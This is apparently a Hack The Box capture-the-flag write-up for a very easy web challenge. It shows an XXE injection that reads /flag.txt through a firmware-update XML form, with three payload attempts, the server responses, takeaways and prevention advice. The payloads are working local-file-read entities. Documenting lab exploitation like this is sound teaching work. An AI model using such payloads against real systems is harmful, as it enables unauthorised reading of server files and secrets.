---
layout: default
title: "Jailbreak - Hack The Box"
---

[← Back to all writeups](/)

# Jailbreak - Hack The Box CTF Try Out

| Info | Detail |
|------|--------|
| Platform | Hack The Box |
| Category | Web / XXE |
| Difficulty | Very Easy |
| Flag | `HTB{bi0m3tric_l0cks_4nd_fl1cker1ng_lights_...}` |

---

## Overview

A Pip-Boy interface (Fallout-themed) with multiple tabs. The ROM tab accepts XML input for "firmware updates." The flag is stored at `/flag.txt` on the server filesystem.

## Reconnaissance

Explored all tabs of the application. The **ROM** tab revealed a "Firmware Update" page with:
- A text area accepting XML input
- A Submit button
- An example XML structure with `<FirmwareUpdateConfig>` schema

```bash
curl http://TARGET:PORT/flag.txt
# {"error": "Not Found"} — not accessible via web, but exists on filesystem
```

## Vulnerability: XXE Injection

The server parses user-supplied XML without disabling external entities. This allows defining a custom entity that reads local files.

## Exploitation

### Attempt 1 — With encoding declaration
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
...
```
**Result:** Server rejected the encoding declaration.

### Attempt 2 — Entity in Description field
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<FirmwareUpdateConfig>
  <Firmware>
    <Description>&xxe;</Description>
    ...
```
**Result:** No output — Description field is not reflected in response.

### Attempt 3 — Entity in multiple fields (SUCCESS)
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
    <ReleaseDate>2077-10-21</ReleaseDate>
    <Description>test</Description>
    <Checksum type="SHA-256">test</Checksum>
  </Firmware>
  <Components>
    <Component name="navigation">
      <Version>&xxe;</Version>
      <Description>&xxe;</Description>
      <Checksum type="SHA-256">&xxe;</Checksum>
    </Component>
  </Components>
  <UpdateURL>&xxe;</UpdateURL>
</FirmwareUpdateConfig>
```

**Result:** `Firmware version HTB{bi0m3tric_l0cks_4nd_fl1cker1ng_lights_...} update initiated.`

The **Version** field was reflected in the server's response message.

## Key Takeaways

- **XML input = test XXE** — it's almost a reflex in web security
- **Not all fields reflect output** — test `&xxe;` in multiple fields simultaneously
- **Remove `<?xml?>` declaration** if the server rejects it
- **`SYSTEM "file:///"` reads local files** through the XML parser
- Prevention: disable DTDs and external entities in the XML parser

## MITRE ATT&CK

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Collection | Data from Local System | T1005 |

**OWASP:** A05:2021 – Security Misconfiguration
